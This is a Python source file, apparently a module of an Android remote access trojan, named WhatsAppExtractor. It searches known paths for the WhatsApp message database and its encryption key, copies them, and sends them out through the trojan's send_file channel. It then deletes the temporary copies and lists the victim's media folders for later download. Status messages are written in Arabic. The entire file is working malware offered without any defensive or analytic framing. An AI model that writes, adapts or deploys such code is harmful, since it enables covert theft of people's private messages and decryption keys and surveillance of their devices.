import os, time, subprocess

class WhatsAppExtractor:
    def __init__(self, rat_instance):
        self.rat = rat_instance

    def extract_all(self) -> str:
        results = []
        results.append(self.extract_database())
        time.sleep(1)
        results.append(self.extract_key())
        time.sleep(1)
        results.append(self.get_media_info())
        return "\n".join(results)

    def extract_database(self) -> str:
        db_paths = [
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
            "/sdcard/WhatsApp/Databases/msgstore.db",
            "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Databases/msgstore.db",
            "/sdcard/Android/media/com.whatsapp.w4b/WhatsApp/Databases/msgstore.db",
        ]
        for db_path in db_paths:
            if os.path.exists(db_path):
                try:
                    sz = os.path.getsize(db_path)
                    sent = self.rat.send_file(db_path, f"💚 واتساب DB ({sz/1024:.1f}KB)")
                    return f"✅ واتساب ({sz/1024:.1f}KB)" if sent else "⚠️ سحب لكن فشل الإرسال"
                except:
                    continue
        data_paths = [
            "/data/data/com.whatsapp/databases/msgstore.db",
            "/data/data/com.whatsapp.w4b/databases/msgstore.db",
        ]
        for dp in data_paths:
            if os.path.exists(dp):
                dst = "/sdcard/wa_msgstore.db"
                os.system(f"cp {dp} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.rat.send_file(dst, f"💚 واتساب ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ واتساب ({sz/1024:.1f}KB)" if sent else "⚠️ فشل إرسال"
        return "❌ واتساب غير موجود"

    def extract_key(self) -> str:
        key_paths = [
            "/data/data/com.whatsapp/files/key",
            "/data/data/com.whatsapp.w4b/files/key",
        ]
        for kp in key_paths:
            if os.path.exists(kp):
                dst = "/sdcard/whatsapp_key"
                os.system(f"cp {kp} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sent = self.rat.send_file(dst, "🔑 مفتاح تشفير واتساب")
                    os.system(f"rm -f {dst}")
                    return "✅ مفتاح التشفير" if sent else "⚠️ فشل إرسال"
        return "⚠️ مفتاح التشفير غير متاح (يحتاج root)"

    def get_media_info(self) -> str:
        media_base = [
            "/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
            "/sdcard/WhatsApp/Media",
        ]
        for base in media_base:
            if os.path.exists(base):
                subdirs = {
                    "WhatsApp Images": "صور", "WhatsApp Video": "فيديو",
                    "WhatsApp Audio": "صوتيات", "WhatsApp Documents": "مستندات",
                    "WhatsApp Voice Notes": "رسائل صوتية", "WhatsApp Stickers": "ملصقات",
                }
                info = []
                total = 0
                for sd, label in subdirs.items():
                    fp = os.path.join(base, sd)
                    if os.path.exists(fp):
                        try:
                            cnt = len(os.listdir(fp))
                            total += cnt
                            info.append(f"{label}: {cnt}")
                        except:
                            pass
                if info:
                    result = "📊 وسائط واتساب:\n" + "\n".join(info)
                    result += f"\n━━━━━━━━━━\n📦 الإجمالي: {total} ملف"
                    result += f"\n💡 استخدم /download {base}/[المجلد]"
                    return result
        return "ℹ️ مجلد وسائط واتساب غير موجود"

    def extract_key_and_db(self) -> str:
        return self.extract_database() + "\n" + self.extract_key()

    def check_installed(self) -> str:
        wa = subprocess.getoutput("pm list packages com.whatsapp 2>/dev/null").strip()
        return "✅ واتساب مثبت" if "whatsapp" in wa else "❌ واتساب غير مثبت"
